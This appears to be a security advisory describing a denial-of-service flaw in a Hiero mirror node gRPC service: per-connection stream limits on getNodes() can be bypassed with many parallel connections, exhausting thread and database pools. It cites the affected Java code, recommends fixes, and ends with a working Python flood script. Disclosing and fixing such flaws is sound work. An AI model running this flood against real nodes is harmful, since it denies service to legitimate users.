### Title
Unbounded Multi-Connection Stream Flood in `NetworkController.getNodes()` Enables Resource Exhaustion DoS

### Summary
`NetworkController.getNodes()` applies no global limit on concurrent streams across all connections. The only guard, `maxConcurrentCallsPerConnection = 5`, is a per-connection limit that an unprivileged attacker trivially bypasses by opening many parallel TCP connections. Each stream drives repeated blocking DB transactions through `Schedulers.boundedElastic()`, exhausting both the bounded elastic thread pool and the HikariCP database connection pool, denying service to legitimate callers.

### Finding Description

**Exact code path:**

`NetworkController.getNodes()` subscribes a new reactive pipeline per call with no admission control: [1](#0-0) 

`GrpcConfiguration` configures only a per-connection stream cap: [2](#0-1) 

`NettyProperties` sets the default to 5 streams per connection — no global cap exists anywhere: [3](#0-2) 

**Root cause — failed assumption:** The design assumes one connection per client. An attacker opens C connections, each with 5 streams, yielding 5C total concurrent streams with zero server-side enforcement.

**Per-stream resource consumption in `NetworkServiceImpl.getNodes()`:**

Each stream immediately executes three synchronous DB queries on subscription (lines 61–66), then enters a paging loop that repeatedly calls `page()` on `Schedulers.boundedElastic()` with a 250 ms inter-page delay: [4](#0-3) 

Each `page()` call acquires a HikariCP connection for the duration of the DB transaction: [5](#0-4) 

`Schedulers.boundedElastic()` caps at `10 × CPU cores` threads by default. With many concurrent streams all blocked inside `transactionOperations.execute()`, this pool saturates. Once saturated, the `repeatWhen` delay scheduling for all streams stalls, and new streams queue indefinitely.

**Why the existing check is insufficient:**

`maxConcurrentCallsPerConnection = 5` is enforced by Netty at the HTTP/2 frame level per TCP connection. It does not count streams across connections. An attacker opens N connections; each is independently allowed 5 streams. Total concurrent streams = 5N, unbounded. [6](#0-5) 

### Impact Explanation

With enough connections the attacker saturates `Schedulers.boundedElastic()` and the HikariCP pool simultaneously. New legitimate `getNodes()` calls block waiting for a scheduler thread or DB connection. Because the gRPC executor dispatches RPC handlers through the same shared pool, other gRPC services (e.g., `ConsensusController`) are also degraded. The result is effective denial of service for all gRPC consumers of the mirror node with no economic cost to the attacker.

### Likelihood Explanation

No authentication is required; the gRPC port (5600) is publicly exposed. Opening hundreds of TCP connections with 5 HTTP/2 streams each is trivially achievable with a single script using any gRPC client library (e.g., `grpc-java`, `grpcurl` in parallel). The attack is repeatable and stateless — the attacker simply keeps connections open and re-opens them if closed. The default `boundedElastic` cap (typically 80–160 threads on a 8–16 core pod) and a small HikariCP pool make the threshold low.

### Recommendation

1. **Add a global concurrent-stream counter** (e.g., `AtomicInteger`) in `NetworkController` or a gRPC interceptor; reject with `RESOURCE_EXHAUSTED` when the global limit is exceeded.
2. **Add `maxConnectionIdle` and `maxConnectionAge`** to `GrpcConfiguration` via `NettyServerBuilder` to bound connection lifetime and prevent indefinite connection holding.
3. **Add a per-source-IP connection limit** via a gRPC `ServerInterceptor` or at the ingress/load-balancer layer.
4. **Cap `Schedulers.boundedElastic()` usage** by switching the `repeatWhen` scheduler to a dedicated, explicitly sized scheduler so its exhaustion does not affect other reactive pipelines.

### Proof of Concept

```python
import grpc
import threading
from hedera.mirror.api.proto import network_service_pb2_grpc
from hedera.mirror.api.proto import consensus_service_pb2 as pb

TARGET = "mirror-node-grpc:5600"
CONNECTIONS = 50   # 50 connections × 5 streams = 250 concurrent streams
STREAMS_PER_CONN = 5

def flood_connection(_):
    channel = grpc.insecure_channel(TARGET)
    stub = network_service_pb2_grpc.NetworkServiceStub(channel)
    threads = []
    for _ in range(STREAMS_PER_CONN):
        def stream():
            # limit=0 → server streams until complete, holding resources
            req = pb.AddressBookQuery(limit=0)
            for _ in stub.getNodes(req):
                pass  # consume slowly / stall
        t = threading.Thread(target=stream, daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

threads = [threading.Thread(target=flood_connection, args=(i,)) for i in range(CONNECTIONS)]
for t in threads: t.start()
for t in threads: t.join()
# Result: boundedElastic pool and HikariCP pool exhausted;
# legitimate getNodes() calls block indefinitely.
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/NetworkController.java (L33-43)
```java
    public void getNodes(final AddressBookQuery request, final StreamObserver<NodeAddress> responseObserver) {
        final var disposable = Mono.fromCallable(() -> toFilter(request))
                .flatMapMany(networkService::getNodes)
                .map(this::toNodeAddress)
                .onErrorMap(ProtoUtil::toStatusRuntimeException)
                .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);

        if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
            serverCallStreamObserver.setOnCancelHandler(disposable::dispose);
        }
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L28-35)
```java
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L11-15)
```java
public class NettyProperties {

    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
}
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/NetworkServiceImpl.java (L68-76)
```java
        return Flux.defer(() -> page(context))
                .repeatWhen(RepeatSpec.create(c -> !context.isComplete(), Long.MAX_VALUE)
                        .jitter(0.5)
                        .withFixedDelay(addressBookProperties.getPageDelay())
                        .withScheduler(Schedulers.boundedElastic()))
                .take(filter.getLimit() > 0 ? filter.getLimit() : Long.MAX_VALUE)
                .doOnNext(context::onNext)
                .doOnSubscribe(s -> log.info("Querying for address book: {}", filter))
                .doOnComplete(() -> log.info("Retrieved {} nodes from the address book", context.getCount()));
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/NetworkServiceImpl.java (L79-107)
```java
    private Flux<AddressBookEntry> page(AddressBookContext context) {
        return transactionOperations.execute(t -> {
            var addressBookTimestamp = context.getAddressBookTimestamp();
            var nodeStakeMap = context.getNodeStakeMap();
            var nextNodeId = context.getNextNodeId();
            var pageSize = addressBookProperties.getPageSize();
            var nodes = addressBookEntryRepository.findByConsensusTimestampAndNodeId(
                    addressBookTimestamp, nextNodeId, pageSize);
            var endpoints = new AtomicInteger(0);

            nodes.forEach(node -> {
                // Override node stake
                node.setStake(nodeStakeMap.getOrDefault(node.getNodeId(), 0L));
                // This hack ensures that the nested serviceEndpoints is loaded eagerly and voids lazy init exceptions
                endpoints.addAndGet(node.getServiceEndpoints().size());
            });

            if (nodes.size() < pageSize) {
                context.completed();
            }

            log.info(
                    "Retrieved {} address book entries and {} endpoints for timestamp {} and node ID {}",
                    nodes.size(),
                    endpoints,
                    addressBookTimestamp,
                    nextNodeId);
            return Flux.fromIterable(nodes);
        });
```
